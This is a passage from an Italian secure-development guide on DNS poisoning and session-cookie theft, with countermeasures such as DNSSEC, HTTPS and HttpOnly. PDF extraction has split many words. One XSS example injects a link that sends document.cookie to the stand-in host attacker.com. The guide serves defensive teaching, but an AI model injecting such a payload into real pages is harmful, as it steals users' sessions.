@@ -1,0 +1,50 @@
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 30  a 156  
+ 
+Tramite la tecnica del DNS poisoning, l’attaccante può inserire record falsati nella cache del DNS Ser ver di 
+cui si serve l’applicazione. Un file utilizzato dal l’applicazione viene risolto puntando a un file for nito 
+dall’attaccante. L’url http://www.example.com/img_4 _cookie.jpg viene risolto dirigendo la richiesta ve rso il 
+file con lo stesso nome fornito dalla macchina dell ’attaccante. Il sito sotto attacco, a quel punto, i nvierà 
+proprio all’attaccante il suo cookie. Dal cookie il  malintenzionato potrà leggere l’id di sessione e u tilizzarlo 
+per un’operazione di spoofing. 
+Contromisure 
+Per prevenire il DNS poisoning, il responsabile del  Domain Name Server può adottare misure di protezio ne 
+che vanno sotto il nome di Domain Name System Security Extensions (DNSSEC) . 
+ 
+6.2.1.1  Cookie 
+L’attacco attraverso il quale un aggressore riesce solitamente ad appropriarsi in modo indebito del co okie 
+di un altro utente è il già menzionato Cross Site S cripting. Altri fattori in fase di sviluppo dell’ap plicazione 
+influenzano comunque la possibilità di portare a te rmine con successo un’attività di Session Stealing.  Questi 
+sono in particolare: 
+• La generazione di cookie il cui tempo di scadenza n on è chiaramente indicato; 
+• La generazione di cookie persistenti sul client anc he dopo il termine della sessione; 
+• La generazione di cookie non cifrati e trasmessi tr amite richieste in chiaro (clear-text); 
+• La validità del cookie anche dopo un periodo di ina ttività dell’utente molto lungo; 
+• L’assenza dell’attributo HttpOnly in fase di genera zione del cookie che ne agevola l’accesso a script 
+client-side; 
+• L’utilizzo di valori ricorrenti (prevedibili) invec e che randomici, nella composizione del cookie, 
+durante la sua generazione. 
+ 
+Esempio:  
+Èpossibile entrare in possesso di un cookie di sess ione, tramite un attacco di Cross Site Scripting, a d 
+esempio iniettando il seguente codice: 
+ 
+<a href="#" onclick="window.location = 'http://atta cker.com/stole.cgi?text=' + 
+escape(document.cookie); return false;">Click here! </a> 
+ 
+L’id di sessione, in quanto autenticato, può essere  utilizzato per effettuare richieste considerate va lide 
+verso il server. Le modalità attraverso le quali è possibile sfruttare gli attributi del cookie rubato  per 
+assegnarli alla propria sessione, dipendono dal bro wser. Alcune estensioni, come ad esempio 
+“EditThisCookie” su Chrome, permettono di modificar e agevolmente il cookie che si sta utilizzando. 
+ 
+Contromisure 
+Per garantire la sicurezza, sarebbe opportuno evita re di utilizzare i cookie, ma questo non è facilmen te 
+realizzabile poiché, nel corso del tempo, i cookie sono diventati sempre più indispensabili nella 
+memorizzazione dei dati. Per impedire il furto dei cookie è quindi necessario, farli viaggiare attrave rso 
+connessioni https crittografate. Un’ulteriore prote zione può essere garantita impostando l’attributo 
+HttpOnly a true, che impone che l’accesso al cookie  solo attraverso il protocollo http, e non tramite uno 
+script client. La policy “Same Origin” garantisce c he il cookie venga trasmesso solo nelle chiamate 
+all’interno dello stesso dominio, impedendo che pos sa essere condiviso con chiamate che provengano da 
+altri domini. Questa policy è oggi adottata in mani era predefinita da tutti i maggiori browser. 
+ 
